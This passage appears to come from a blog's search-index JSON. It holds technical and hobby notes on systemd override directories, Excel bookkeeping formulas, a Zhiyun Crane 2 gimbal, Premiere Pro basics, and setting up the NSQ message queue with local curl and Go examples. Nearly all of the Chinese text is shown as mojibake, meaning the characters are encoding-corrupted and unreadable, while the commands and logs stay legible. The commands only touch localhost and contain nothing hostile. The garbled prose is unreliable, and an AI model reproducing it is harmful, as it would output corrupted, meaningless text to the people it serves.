åœ¨`/etc/systemd/system`ä¸‹é¢åˆ›å»º`nginx.service.d`ç›®å½•ï¼Œåœ¨è¿™ä¸ªç›®å½•é‡Œé¢æ–°å»ºä»»ä½•ä»¥.confç»“å°¾çš„æ–‡ä»¶ï¼Œç„¶åå†™å…¥æˆ‘ä»¬è‡ªå·±çš„é…ç½®ã€‚æ¨èè¿™ç§åšæ³•ã€‚\n\n`/run/systemd/system`è¿™ä¸ªç›®å½•ä¸€èˆ¬æ˜¯è¿›ç¨‹åœ¨è¿è¡Œæ—¶åŠ¨æ€åˆ›å»ºunitæ–‡ä»¶çš„ç›®å½•ï¼Œä¸€èˆ¬å¾ˆå°‘ä¿®æ”¹ï¼Œé™¤éæ˜¯ä¿®æ”¹ç¨‹åºè¿è¡Œæ—¶çš„ä¸€äº›å‚æ•°æ—¶ï¼Œå³Sessionçº§åˆ«çš„ï¼Œæ‰åœ¨è¿™é‡Œåšä¿®æ”¹ã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://unix.stackexchange.com/questions/206315/whats-the-difference-between-usr-lib-systemd-system-and-etc-systemd-system\n+ https://wiki.archlinux.org/index.php/Systemd","tags":["systemd"],"categories":["å‘½ä»¤"]},{"title":"excelåˆ¶ä½œè®°è´¦æœ¬åŠŸèƒ½","url":"%2Fp%2F34a34835.html","content":"\næƒ³ç”¨excel å®ç°ä¸€ä¸ªç®€å•çš„è®°è´¦è¡¨ï¼Œå¦‚ä¸‹å›¾ï¼š\n\n![1](excelåˆ¶ä½œè®°è´¦æœ¬åŠŸèƒ½/1.png)\n\n<!-- more -->\n\n\n\n\n### 1. ç¬¬ä¸€è¡Œåˆ°å½“å‰è¡Œæ±‚å’Œ\n\n`=SUM(INDIRECT(\"A1:A\"&ROW()))`\n\n### 2. é™¤äº†ç¬¬ä¸€åˆ—é€‰ä¸­æ•´åˆ—\n\né€‰ä¸­æ•´åˆ—å°±æ˜¯åŒå‡»æ•´åˆ—\n\né™¤äº†ç¬¬ä¸€åˆ—ä¸é€‰, é‚£ä¹ˆåœ¨ç¬¬äºŒåˆ—, cmd+shift+â†“, å¦‚æœæœ‰æ•°æ®â†“æŒ‰ä¸¤æ¬¡\n\n### 3. å…¬å¼åº”ç”¨æ•´åˆ—\n\né€‰ä¸­æ•´åˆ— ctrl+d   åº”ç”¨æ‰€æœ‰æ ·å¼\n\n### 4. IF å‡½æ•°\n\n=IF(1>2,\"åˆ¤æ–­çœŸ\",\"åˆ¤æ–­å‡\")\n\n### 5. é™åˆ¶æ•°å­—\n\né€‰ä¸­åˆ—, å³é”®æ•°æ®éªŒè¯, å¼€å¯\n\n### 6. åˆ é™¤æ•°æ®, ä¸åˆ é™¤å…¬å¼\n\nè½¯ä»¶æ”¯æŒï¼Œåœ¨çº¿æ–‡æ¡£ä¸æ”¯æŒã€‚\n\n### 7. å¦‚æœå‰é¢æœ‰å€¼, åé¢è‡ªåŠ¨è®¡ç®—,  å¦åˆ™æ˜¾ç¤ºç©º\n\n+ æ€»é‡‘é¢\n\n   `=IF(ISBLANK(C4),\"\",SUM(INDIRECT(\"C4:C\"&ROW()))) `  // C4æ˜¯ç¬¬ä¸€ä¸ªæ•°æ®, å¯¹ä¸‹é¢çš„åˆ—åº”ç”¨æ ·å¼\n\n\n","tags":["excel"],"categories":["ä¸ªäººè®°å½•"]},{"title":"æ™ºäº‘äº‘é¹¤2_crane2æ•™ç¨‹","url":"%2Fp%2F3bad91c1.html","content":"\n\n\n### 1. å®‰è£…\n\n+ å®‰è£…ç”µæ± \n+ æ‹§ä¸Šä¸‰è„šæ¶\n\n### 2. å¹³è¡¡\n\nè°ƒèŠ‚å¹³è¡¡ä¹‹å‰éœ€è¦å…ˆè®¤æ¸…ä¸‰ä¸ªè½´:\n\n+ ä¿¯ä»°è½´   ç›¸æœºçš„å³ä¾§çš„é‚£ä¸ªåœ†åœˆ(è½¬åŠ¨æ”¹å˜è§’åº¦)\n\n+ æ¨ªæ»šè½´   åæ–¹å†™ç€æ™ºäº‘å­—ä½“çš„é‚£ä¸ªåœ†åœˆ(è²Œä¼¼ä¸ä¼šè½¬åŠ¨,å€¾æ–œæ”¹å˜è§’åº¦)\n\n+ èˆªå‘è½´   æ‰‹æŸ„ä¸Šæ–¹çš„é‚£ä¸ªåœ†åœˆ(è½¬åŠ¨æ”¹å˜è§’åº¦)\n\n  \n\n##### 2.1 è°ƒèŠ‚å¹³è¡¡\n\n+ å…ˆè°ƒèŠ‚ä¿¯ä»°è½´æ°´å¹³, å‰åç§»åŠ¨å¿«è£…æ¿, æ¾æ‰‹æ°´å¹³åæ‹§ç´§å¿«è£…æ¿èºä¸\n+ å†è°ƒèŠ‚ä¿¯ä»°è½´å‚ç›´, æ¾æ‰‹å‚ç›´åæ‹§ç´§ä¿¯ä»°è½´èºä¸\n+ å†è°ƒèŠ‚æ¨ªæ»šè½´, æ¾æ‰‹æ°´å¹³åæ‹§ç´§æ¨ªæ»šè½´èºä¸\n+ æœ€åè°ƒèŠ‚èˆªå‘è½´, æŠŠä¸‰è„šæ¶æ€¼ç€è‚šå­,æ¾æ‰‹æ°´å¹³åæ‹§ç´§èˆªå‘è½´èºä¸\n\n<!-- more -->\n\n### 3. APP\n\n+ ZY Play(å¯ä»¥æ§åˆ¶crane2)\n+ æ™ºäº‘æŒä¸ŠåŠ©æ‰‹ (è²Œä¼¼åªèƒ½çœ‹è§’åº¦)\n\n\n\n#### 4. SONY\n\n+ è¿æ¥ç›¸æœºçº¿, å…ˆå¼€ç¨³å®šå™¨, å†å¼€ç›¸æœº\n+ cameraä¿®æ”¹ç›¸æœºä¸º sony, false(ä¸ä¸ºç›¸æœºä¾›ç”µ, å¯¹ç»™ç›¸æœºå¤‡ç”µæ± )\n+ ç”µæºé”®å½•åƒ, ç¡®è®¤é”®æ‹ç…§\n+ è·Ÿç„¦ä¸æ”¯æŒ,å¯ä»¥ç”¨å¤–ç½®ä¼ºæœè·Ÿç„¦å™¨(æ²¡å•¥åµç”¨)\n\n\n\n### 5. æ¨¡å¼\n\n##### 5.1 PF å·¦å³è·Ÿéšæ¨¡å¼ (ä¸€ç›´ä¿æŒæ°´å¹³)===>éœ€è¦è‡ªå·±æ§åˆ¶å·¦å³è½¬\n\n+ ä¿¯ä»°å’Œæ¨ªæ»šé”å®š, æ°´å¹³æ–¹å‘éšç€æ‰‹æŸ„è½¬åŠ¨\n\n+ å‘ä¸Šå’Œå‘ä¸‹æ”¹å˜ä»°è§’\n\n##### 5.2 L å…¨é”å®šæ¨¡å¼ (ä¿æŒæ°´å¹³å’Œå‚ç›´)===>éœ€è¦è‡ªå·±æ§åˆ¶ä»»ä½•æ–¹å‘\n\n+ ä¸‰ä¸ªè½´éƒ½é”å®š\n\n+ å‘ä¸Šå’Œå‘ä¸‹æ”¹å˜ä»°è§’\n\n+ å‘å·¦å’Œå‘å³æ”¹å˜æœå‘\n\n##### 5.3 F å…¨è·Ÿéšæ¨¡å¼ (æ°´å¹³å’Œå‚ç›´éƒ½æ´»)===>æ§åˆ¶å¥½è‡ªå·±\n\n+ æ¨ªæ»šé”å®š\n+ ä¿¯ä»°å’Œæœå‘éšæ‰‹æŸ„è½¬åŠ¨\n+ å‘å·¦å’Œå‘å³æ”¹å˜æ¨ªæ»šè§’åº¦\n\n##### 5.4 POV ç¬¬ä¸€è§†è§’æ¨¡å¼(360åº¦æ— æ­»è§’)===>è‡ªå·±è½¬æ‰‹æŸ„å¯¹å‡†(éš¾åº¦é«˜)\n\n+ ä¸Šä¸‹ç”»åœˆæ—‹è½¬\n+ æ‰‹æŸ„é¡ºæ—¶é’ˆå’Œé€†æ—¶é’ˆè½¬åŠ¨\n+ å®šå™¨æ‰‹æŸ„é¡¶ç«¯ä½œå®šå‘ç‚¹ï¼Œæ‰‹æŸ„æœ«ç«¯ä½œè½¬å‘ç‚¹\n\n##### 5.5 V ä¸‰å›´æ¢¦å¢ƒæ¨¡å¼===>æ¡ç´§æ‰‹æŸ„,ç‚¹æŒ‰é’®ç¿»è½¬\n\n+ å‰è¿›/åé€€ä¸­æŒ‰é’®æ—‹è½¬\n+ å‘å·¦å’Œå‘å³æ—‹è½¬ç›¸æœº\n+ å³ä½¿ä¸‰ç»´æ¢¦å¢ƒçš„æ‹æ‘„æ•ˆæœæ˜¯ç”»é¢çš„é¡º/é€†æ—¶é’ˆæ—‹è½¬ï¼Œä½†å®é™…ç¨³å®šå™¨çš„è¿åŠ¨è½¨è¿¹å¹¶éæ˜¯æ¨ªæ»šè½´ï¼Œè€Œæ˜¯èˆªå‘è½´ ã€‚\n+ åœ¨æ‹æ‘„å‰éœ€æ³¨æ„è¿›è¡Œç›¸æœºè°ƒå¹³ï¼Œå°¤ä¸ºæ˜¯å®¹æ˜“è¢«å¿½ç•¥çš„èˆªå‘è½´è°ƒå¹³ï¼Œä»¥ä¾¿å‘æŒ¥ç¨³å®šå™¨çš„æœ€å¤§åŠŸç‡å®ç°å®Œç¾æ‹æ‘„ã€‚\n\n\n\n#### 6. é…ä»¶\n\n+ å¤–ç½®ä¼ºæœè·Ÿç„¦å™¨, å› ä¸ºsony ä¸æ”¯æŒè·Ÿç„¦, å¯ä»¥ç”¨ä½œç‰©ç†è·Ÿç„¦, å·²æŒ‚é—²é±¼\n+ é³ç”²ç›‘è§†å™¨, éœ€è¦å¦è´­ä¹°é…ä»¶(è›‡ç®¡æ€ªæ‰‹), å·²æŒ‚é—²é±¼","tags":["photo"],"categories":["æ‘„å½±"]},{"title":"prå…¥é—¨æ•™ç¨‹ç¬”è®°","url":"%2Fp%2Fe24658ca.html","content":"\n\n\n\n### 0. å®‰è£…\n\n+ windows\n\n+ mac\n\n### 1. åŸºç¡€æ“ä½œ\n\n##### 1.1 è½¯ä»¶\n\n+ æ–°å»ºé¡¹ç›®\n+ çª—å£->å·¥ä½œåŒº->é‡ç½®\n+ é¦–é€‰é¡¹->è‡ªåŠ¨ä¿å­˜\n\n<!-- more -->\n\n##### 1.2 å¯¼å…¥\n\n+ åŒå‡»\n+ å³é”®->å¯¼å…¥\n+ æ‹–åˆ°æ–‡ä»¶å¤¹->å¯¼å…¥(æå‰å½’ç±»å¥½æ–‡ä»¶å¤¹èµ„æº)\n\n##### 1.3 åºåˆ—\n\n+ æ‰‹åŠ¨æ–°å»ºåºåˆ—, å¦‚1080P 25fpsâ€¦.\n+ ç›´æ¥é€šè¿‡èµ„æºæ¥åˆ›å»ºåºåˆ—\n+ v1,v2,v3 è§†é¢‘æ®µ,  a1,a2,a3 éŸ³é¢‘æ®µ\n+ è§†é¢‘å¯ä»¥å¼€å…³å°çœ¼ç›å…³é—­, éŸ³é¢‘å¯ä»¥mé™éŸ³\n+ å¯ä»¥ä¸Šä¸‹æ¨æ‹‰, è°ƒæ•´åºåˆ—æ®µçš„å®½åº¦\n+ é€Ÿåº¦/\bæŒç»­æ—¶é—´ å¯åˆ¶ä½œå‡æ ¼é™æ ¼, åºåˆ—å‰é¢ä¼šå‡ºç°fxæ ‡è¯†, (æ‹æ‘„100ps, é™ä½åˆ°25ps)\n+ åºåˆ—å¯ä»¥æ‹–åŠ¨å¹¶å…¥ä¹‹å‰çš„ç³»åˆ—\n\n##### 1.4 æ“ä½œ\n\n+ Mæ ‡è®° -> å‰ªåˆ€è£å‰ª -> æ³¢çº¹åˆ é™¤ \n+ alt æŒ‰åºåˆ—æ®µ -> æ‹–åˆ° -> å¤åˆ¶\n\n##### 1.5 è½¬åœº\n\n+ æ•ˆæœ -> è§†é¢‘è¿‡æ¸¡ -> æ‹–åŠ¨ -> æ”¾åœ¨ä¸¤ä¸ªæ®µä¸­é—´\n+ å¸¸ç”¨çš„æ˜¯ äº¤å‰æº¶è§£\n\n##### 1.6 éŸ³æ•ˆ\n\n+ ç‚¹ä¸­éŸ³ä¹æ®µ, å·¦ä¸Šè§’è°ƒèŠ‚çº§åˆ«(æ§åˆ¶éŸ³é‡, è´Ÿæ— ç©·åˆ°æ­£æ— ç©·)\n+ ç‚¹å‡»å‰é¢çš„å°é—¹é’Ÿ, ç„¶åå†Kå¸§, å¯ä»¥åˆ¶ä½œéŸ³é‡çš„å˜åŒ–\n\n##### 1.7 å­—å¹•\n\n+ çª—å£ -> å­—å¹• -> æ–°å»ºå­—å¹•\n\n##### 1.8 å¯¼å‡º\n\n+ æ–‡ä»¶ -> å¯¼å‡º -> H.264(mp4æ ¼å¼)\n+ é€šè¿‡è°ƒèŠ‚æ¯”ç‰¹ç‡/æœ€å¤§æ¯”ç‰¹ç‡ å¯ä»¥é™ä½æ–‡ä»¶çš„å¤§å°\n\n### 2. å¿«æ·é”®\n\n+ v é€‰æ‹©\n+ c å‰ªåˆ€\n+ m æ ‡è®°\n+ ~ å…¨å±\n+ space æ’­æ”¾/æš‚åœ\n+ å·¦å³ç®­å¤´  æ‰‹åŠ¨èµ°å¸§\n+ alt+é¼ æ ‡æ»šè½®  æ”¾å¤§ç¼©å°åºåˆ—\n+ del åˆ é™¤\n\n### 3. æ’ä»¶\n\n+ ç£¨çš®æ’ä»¶ Digital Anarchy Beauty Box\n\n  + show mask\n\n  + å¸å–ä½é¢œè‰²å’Œé«˜é¢œè‰²\n  + è°ƒèŠ‚ç¬¬äºŒä¸ªå‚æ•°(skin detail amount?), åŠ å¤§ç£¨çš®\n\n### 4. é‡åˆ°çš„é—®é¢˜\n\n+ Q: éŸ³æ•ˆå¸§æ— æ³•æ§åˆ¶\n\n  A: æŠŠæ•ˆæœ->çº§åˆ«ä¸Šé¢çš„é‚£ä¸ªå±æ€§(Bypass/æ—è·¯)ç»™å…³é—­\n\n+ Q: æ— æ³•åˆ é™¤è§†é¢‘è½¬åœº\n\n  A: æŠŠè§†é¢‘æ®µå®½åº¦é™ä½æˆ–å¢å¤§, ç‚¹å‡»è½¬åœºæ–‡å­—,åˆ é™¤\n\n### 5. æŠ€å·§\n\n+ åºåˆ—å½’ç±»åˆå¹¶\n\n  1. æ¯ä¸ªéŸ³é¢‘å¯ä»¥æ–°å»ºä¸€ä¸ªåŒååºåˆ—, ç„¶åå‰ªè¾‘åå½¢æˆæ–°çš„åºåˆ—\n\n  2. æœ€åæ–°å»ºä¸€ä¸ªåºåˆ—, æŠŠä¹‹å‰çš„åºåˆ—éƒ½æ‹–åˆ°è¿‡æ¥\n\n  3. å¦‚æœè§†é¢‘æ¯”è¾ƒå¤§, å¯ä»¥æŠŠæ­¥éª¤1çš„åºåˆ—å¯¼å‡ºä¸ºè§†é¢‘, å†è¿›è¡Œç¬¬äºŒä¸ªæ­¥éª¤\n\n+ å‰ªè¾‘æ”¶å°¾\n  1. éŸ³æ•ˆKå¸§å˜è´Ÿæ— ç©·\n  2. å¯ä»¥å¯¼å‡ºå¸§,å½¢æˆä¸€ä¸ªpng, åœç•™å‡ ç§’\n\n### 6. å‚è€ƒæ•™ç¨‹\n\n+ https://www.bilibili.com/video/av8703816/","tags":["photo"],"categories":["æ‘„å½±"]},{"title":"nsqçš„ä»‹ç»å’Œä½¿ç”¨","url":"%2Fp%2F17c769c4.html","content":"\n# 1. nsq ä»‹ç»\n\n[nsq](https://github.com/bitly/nsq)æ˜¯ä¸€ä¸ªåŸºäºGoè¯­è¨€çš„åˆ†å¸ƒå¼å®æ—¶æ¶ˆæ¯å¹³å°ï¼Œnsqå¯ç”¨äºå¤§è§„æ¨¡ç³»ç»Ÿä¸­çš„å®æ—¶æ¶ˆæ¯æœåŠ¡ï¼Œå¹¶ä¸”æ¯å¤©èƒ½å¤Ÿå¤„ç†æ•°äº¿çº§åˆ«çš„æ¶ˆæ¯ï¼Œå…¶è®¾è®¡ç›®æ ‡æ˜¯ä¸ºåœ¨åˆ†å¸ƒå¼ç¯å¢ƒä¸‹è¿è¡Œçš„å»ä¸­å¿ƒåŒ–æœåŠ¡æä¾›ä¸€ä¸ªå¼ºå¤§çš„åŸºç¡€æ¶æ„ã€‚\n\n<!-- more -->\n\n### 1.1 nsq çš„ç»„æˆ\n\nnsqæ˜¯ç”±å››ä¸ªé‡è¦ç»„ä»¶æ„æˆï¼š\n\n- [nsqd](http://bitly.github.io/nsq/components/nsqd.html)ï¼šä¸€ä¸ªè´Ÿè´£æ¥æ”¶ã€æ’é˜Ÿã€è½¬å‘æ¶ˆæ¯åˆ°å®¢æˆ·ç«¯çš„å®ˆæŠ¤è¿›ç¨‹\n- [nsqlookupd](http://bitly.github.io/nsq/components/nsqlookupd.html)ï¼šç®¡ç†æ‹“æ‰‘ä¿¡æ¯å¹¶æä¾›æœ€ç»ˆä¸€è‡´æ€§çš„å‘ç°æœåŠ¡çš„å®ˆæŠ¤è¿›ç¨‹\n- [nsqadmin](http://bitly.github.io/nsq/components/nsqadmin.html)ï¼šä¸€å¥—Webç”¨æˆ·ç•Œé¢ï¼Œå¯å®æ—¶æŸ¥çœ‹é›†ç¾¤çš„ç»Ÿè®¡æ•°æ®å’Œæ‰§è¡Œå„ç§å„æ ·çš„ç®¡ç†ä»»åŠ¡\n- [utilities](http://nsq.io/components/utilities.html)ï¼šå¸¸è§åŸºç¡€åŠŸèƒ½ã€æ•°æ®æµå¤„ç†å·¥å…·ï¼Œå¦‚nsq_statã€nsq_tailã€nsq_to_fileã€nsq_to_httpã€nsq_to_nsqã€to_nsq\n\n### 1.2 nsqçš„ä¸»è¦ç‰¹ç‚¹\n\n- å…·æœ‰åˆ†å¸ƒå¼ä¸”æ— å•ç‚¹æ•…éšœçš„æ‹“æ‰‘ç»“æ„ æ”¯æŒæ°´å¹³æ‰©å±•ï¼Œåœ¨æ— ä¸­æ–­æƒ…å†µä¸‹èƒ½å¤Ÿæ— ç¼åœ°æ·»åŠ é›†ç¾¤èŠ‚ç‚¹\n- ä½å»¶è¿Ÿçš„æ¶ˆæ¯æ¨é€ï¼Œå‚è§å®˜æ–¹æä¾›çš„[æ€§èƒ½è¯´æ˜æ–‡æ¡£](http://nsq.io/overview/performance.html)\n- å…·æœ‰ç»„åˆå¼çš„è´Ÿè½½å‡è¡¡å’Œå¤šæ’­å½¢å¼çš„æ¶ˆæ¯è·¯ç”±\n- æ—¢æ“…é•¿å¤„ç†é¢å‘æµï¼ˆé«˜ååé‡ï¼‰çš„å·¥ä½œè´Ÿè½½ï¼Œä¹Ÿæ“…é•¿å¤„ç†é¢å‘Jobçš„ï¼ˆä½ååé‡ï¼‰å·¥ä½œè´Ÿè½½\n- æ¶ˆæ¯æ•°æ®æ—¢å¯ä»¥å­˜å‚¨äºå†…å­˜ä¸­ï¼Œä¹Ÿå¯ä»¥å­˜å‚¨åœ¨ç£ç›˜ä¸­\n- å®ç°äº†ç”Ÿäº§è€…ã€æ¶ˆè´¹è€…è‡ªåŠ¨å‘ç°å’Œæ¶ˆè´¹è€…è‡ªåŠ¨è¿æ¥ç”Ÿäº§è€…ï¼Œå‚è§nsqlookupd\n- æ”¯æŒå®‰å…¨ä¼ è¾“å±‚åè®®ï¼ˆTLSï¼‰ï¼Œä»è€Œç¡®ä¿äº†æ¶ˆæ¯ä¼ é€’çš„å®‰å…¨æ€§\n- å…·æœ‰ä¸æ•°æ®æ ¼å¼æ— å…³çš„æ¶ˆæ¯ç»“æ„ï¼Œæ”¯æŒJSONã€Protocol Buffersã€MsgPacekç­‰æ¶ˆæ¯æ ¼å¼\n- éå¸¸æ˜“äºéƒ¨ç½²ï¼ˆå‡ ä¹æ²¡æœ‰ä¾èµ–ï¼‰å’Œé…ç½®ï¼ˆæ‰€æœ‰å‚æ•°éƒ½å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œè¿›è¡Œé…ç½®ï¼‰\n- ä½¿ç”¨äº†ç®€å•çš„TCPåè®®ä¸”å…·æœ‰å¤šç§è¯­è¨€çš„å®¢æˆ·ç«¯åŠŸèƒ½åº“\n- å…·æœ‰ç”¨äºä¿¡æ¯ç»Ÿè®¡ã€ç®¡ç†å‘˜æ“ä½œå’Œå®ç°ç”Ÿäº§è€…ç­‰çš„HTTPæ¥å£\n- ä¸ºå®æ—¶æ£€æµ‹é›†æˆäº†ç»Ÿè®¡æ•°æ®æ”¶é›†å™¨[StatsD](https://github.com/etsy/statsd/)\n- å…·æœ‰å¼ºå¤§çš„é›†ç¾¤ç®¡ç†ç•Œé¢ï¼Œå‚è§nsqadmin\n\n\n\n# 2. nsq ç»„ä»¶\n\n### 2.1 nsqd (çœŸæ­£å¹²æ´»çš„)\n\n1. nsqd æ˜¯ä¸€ä¸ªå®ˆæŠ¤è¿›ç¨‹ï¼Œè´Ÿè´£æ¥æ”¶ï¼Œæ’é˜Ÿï¼ŒæŠ•é€’æ¶ˆæ¯ç»™å®¢æˆ·ç«¯\n2. ç®€å•çš„è¯´ï¼ŒçœŸæ­£å¹²æ´»çš„å°±æ˜¯è¿™ä¸ªæœåŠ¡ï¼Œå®ƒä¸»è¦è´Ÿè´£messageçš„æ”¶å‘ï¼Œé˜Ÿåˆ—çš„ç»´æŠ¤ã€‚nsqdä¼šé»˜è®¤ç›‘å¬ä¸€ä¸ªtcpç«¯å£(4150)å’Œä¸€ä¸ªhttpç«¯å£(4151)ä»¥åŠä¸€ä¸ªå¯é€‰çš„httpsç«¯å£\n3. nsqd å…·æœ‰ä»¥ä¸‹åŠŸèƒ½æˆ–ç‰¹æ€§\n\n* å¯¹è®¢é˜…äº†åŒä¸€ä¸ªtopicï¼ŒåŒä¸€ä¸ªchannelçš„æ¶ˆè´¹è€…ä½¿ç”¨è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼ˆä¸æ˜¯è½®è¯¢ï¼‰\n* åªè¦channelå­˜åœ¨ï¼Œå³ä½¿æ²¡æœ‰è¯¥channelçš„æ¶ˆè´¹è€…ï¼Œä¹Ÿä¼šå°†ç”Ÿäº§è€…çš„messageç¼“å­˜åˆ°é˜Ÿåˆ—ä¸­ï¼ˆæ³¨æ„æ¶ˆæ¯çš„è¿‡æœŸå¤„ç†ï¼‰\n* ä¿è¯é˜Ÿåˆ—ä¸­çš„messageè‡³å°‘ä¼šè¢«æ¶ˆè´¹ä¸€æ¬¡ï¼Œå³ä½¿nsqdé€€å‡ºï¼Œä¹Ÿä¼šå°†é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯æš‚å­˜ç£ç›˜ä¸Š(ç»“æŸè¿›ç¨‹ç­‰æ„å¤–æƒ…å†µé™¤å¤–)\n* é™å®šå†…å­˜å ç”¨ï¼Œèƒ½å¤Ÿé…ç½®nsqdä¸­æ¯ä¸ªchannelé˜Ÿåˆ—åœ¨å†…å­˜ä¸­ç¼“å­˜çš„messageæ•°é‡ï¼Œä¸€æ—¦è¶…å‡ºï¼Œmessageå°†è¢«ç¼“å­˜åˆ°ç£ç›˜ä¸­\n* topicï¼Œchannelä¸€æ—¦å»ºç«‹ï¼Œå°†ä¼šä¸€ç›´å­˜åœ¨ï¼Œè¦åŠæ—¶åœ¨ç®¡ç†å°æˆ–è€…ç”¨ä»£ç æ¸…é™¤æ— æ•ˆçš„topicå’Œchannelï¼Œé¿å…èµ„æºçš„æµªè´¹\n\n\n\n### 2.2 nsqlookupd(ä¸­å¿ƒç®¡ç†æœåŠ¡)\n\n0. nsqlookupdæ˜¯å®ˆæŠ¤è¿›ç¨‹è´Ÿè´£ç®¡ç†æ‹“æ‰‘ä¿¡æ¯ã€‚å®¢æˆ·ç«¯é€šè¿‡æŸ¥è¯¢ nsqlookupd æ¥å‘ç°æŒ‡å®šè¯é¢˜ï¼ˆtopicï¼‰çš„ç”Ÿäº§è€…ï¼Œå¹¶ä¸” nsqd èŠ‚ç‚¹å¹¿æ’­è¯é¢˜ï¼ˆtopicï¼‰å’Œé€šé“ï¼ˆchannelï¼‰ä¿¡æ¯\n\n1. ç®€å•çš„è¯´nsqlookupdå°±æ˜¯ä¸­å¿ƒç®¡ç†æœåŠ¡ï¼Œå®ƒä½¿ç”¨tcp(é»˜è®¤ç«¯å£4160)ç®¡ç†nsqdæœåŠ¡ï¼Œä½¿ç”¨http(é»˜è®¤ç«¯å£4161)ç®¡ç†nsqadminæœåŠ¡ã€‚åŒæ—¶ä¸ºå®¢æˆ·ç«¯æä¾›æŸ¥è¯¢åŠŸèƒ½\n\n2. nsqlookupdå…·æœ‰ä»¥ä¸‹åŠŸèƒ½æˆ–ç‰¹æ€§\n\n* å”¯ä¸€æ€§ï¼Œåœ¨ä¸€ä¸ªNsqæœåŠ¡ä¸­åªæœ‰ä¸€ä¸ªnsqlookupdæœåŠ¡ã€‚å½“ç„¶ä¹Ÿå¯ä»¥åœ¨é›†ç¾¤ä¸­éƒ¨ç½²å¤šä¸ªnsqlookupdï¼Œä½†å®ƒä»¬ä¹‹é—´æ˜¯æ²¡æœ‰å…³è”çš„\n* å»ä¸­å¿ƒåŒ–ï¼Œå³ä½¿nsqlookupdå´©æºƒï¼Œä¹Ÿä¼šä¸å½±å“æ­£åœ¨è¿è¡Œçš„nsqdæœåŠ¡\n* å……å½“nsqdå’Œnaqadminä¿¡æ¯äº¤äº’çš„ä¸­é—´ä»¶\n* æä¾›ä¸€ä¸ªhttpæŸ¥è¯¢æœåŠ¡ï¼Œç»™å®¢æˆ·ç«¯å®šæ—¶æ›´æ–°nsqdçš„åœ°å€ç›®å½• \n\n\n\n### 2.3 nsqadmin(å±•ç¤ºæ•°æ®)\n\n0. æ˜¯ä¸€å¥— WEB UIï¼Œç”¨æ¥æ±‡é›†é›†ç¾¤çš„å®æ—¶ç»Ÿè®¡ï¼Œå¹¶æ‰§è¡Œä¸åŒçš„ç®¡ç†ä»»åŠ¡\n1. nsqadminå…·æœ‰ä»¥ä¸‹åŠŸèƒ½æˆ–ç‰¹æ€§\n    * æä¾›ä¸€ä¸ªå¯¹topicå’Œchannelç»Ÿä¸€ç®¡ç†çš„æ“ä½œç•Œé¢ä»¥åŠå„ç§å®æ—¶ç›‘æ§æ•°æ®çš„å±•ç¤ºï¼Œç•Œé¢è®¾è®¡çš„å¾ˆç®€æ´ï¼Œæ“ä½œä¹Ÿå¾ˆç®€å•\n    * å±•ç¤ºæ‰€æœ‰messageçš„æ•°é‡ï¼Œæ©....è£…Xåˆ©å™¨\n    * èƒ½å¤Ÿåœ¨åå°åˆ›å»ºtopicå’Œchannelï¼Œè¿™ä¸ªåº”è¯¥ä¸å¸¸ç”¨åˆ°\n    * nsqadminçš„æ‰€æœ‰åŠŸèƒ½éƒ½å¿…é¡»ä¾èµ–äºnsqlookupdï¼Œnsqadminåªæ˜¯å‘nsqlookupdä¼ é€’ç”¨æˆ·æ“ä½œå¹¶å±•ç¤ºæ¥è‡ªnsqlookupdçš„æ•°æ®\n\n\n\n# 3. nsq æ“ä½œ\n\n### 3.1 å®‰è£…å’Œå¯åŠ¨\n\nå®‰è£… nsq\n\n```Â bash\nbrew install nsq \n```\n\nå¯åŠ¨ nsqlookupd\n\n```bash\nnsqlookupd\n\n[nsqlookupd] 2020/07/14 13:10:26.005144 INFO: nsqlookupd v1.2.0 (built w/go1.13.5)\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: HTTP: listening on [::]:4161 # ç®¡ç† nsqd\n[nsqlookupd] 2020/07/14 13:10:26.006620 INFO: TCP: listening on [::]:4160 # ç®¡ç† nsqadmin\n```\n\nå¯åŠ¨ nsqd\n\n```bash\nnsqd --lookupd-tcp-address=127.0.0.1:4160 -broadcast-address=127.0.0.1\n\n[nsqd] 2020/07/14 13:11:55.889343 INFO: nsqd v1.2.0 (built w/go1.13.5)\n[nsqd] 2020/07/14 13:11:55.889519 INFO: ID: 24\n[nsqd] 2020/07/14 13:11:55.889954 INFO: NSQ: persisting topic/channel metadata to nsqd.dat\n[nsqd] 2020/07/14 13:11:55.909569 INFO: TCP: listening on [::]:4150 # tcpç›‘å¬4150\n[nsqd] 2020/07/14 13:11:55.909673 INFO: HTTP: listening on [::]:4151 # httpç›‘å¬4151\n[nsqd] 2020/07/14 13:11:55.909858 INFO: LOOKUP(127.0.0.1:4160): adding peer\n[nsqd] 2020/07/14 13:11:55.909872 INFO: LOOKUP connecting to 127.0.0.1:4160\n[nsqd] 2020/07/14 13:11:55.914186 INFO: LOOKUPD(127.0.0.1:4160): peer info {TCPPort:4160 HTTPPort:4161 Version:1.2.0 BroadcastAddress:liuweideMacBook-Air.local}\n```\n\nå¯åŠ¨ nsqadmin\n\n```bash\nnsqadmin --lookupd-http-address=127.0.0.1:4161\n\n[nsqadmin] 2020/07/14 13:13:39.580161 INFO: nsqadmin v1.2.0 (built w/go1.13.5)\n[nsqadmin] 2020/07/14 13:13:39.581124 INFO: HTTP: listening on [::]:4171 # ç›‘å¬4171\n```\n\n### 3.2 æ“ä½œ\n\n+ æµè§ˆå™¨è®¿é—® http://127.0.0.1:4171/ è§‚å¯Ÿæ•°æ®\n\n+ å‘å¸ƒä¸€ä¸ªæ¶ˆæ¯ \n\n  ```bash\n  curl -d 'levonfly1' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n+ åˆ›å»ºä¸€ä¸ªæ¶ˆè´¹è€…\n\n  ```bash\n  nsq_to_file --topic=test --output-dir=/tmp --lookupd-http-address=127.0.0.1:4161\n  ```\n  å¯ä»¥åœ¨/tmp/æ–‡ä»¶å¤¹å†…çœ‹åˆ°è¾“å…¥çš„æ¶ˆæ¯log\n\n  \n\n+ å†å‘å¸ƒå‡ ä¸ªæ¶ˆæ¯\n\n  ```bash\n  curl -d 'levonfly2' 'http://127.0.0.1:4151/pub?topic=test'\n  curl -d 'levonfly3' 'http://127.0.0.1:4151/pub?topic=test'\n  ```\n\n\n\n# 4. golang ä½¿ç”¨ nsq\n\n### 4.1 ç”Ÿäº§è€…\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"time\"\n\n\tnsq 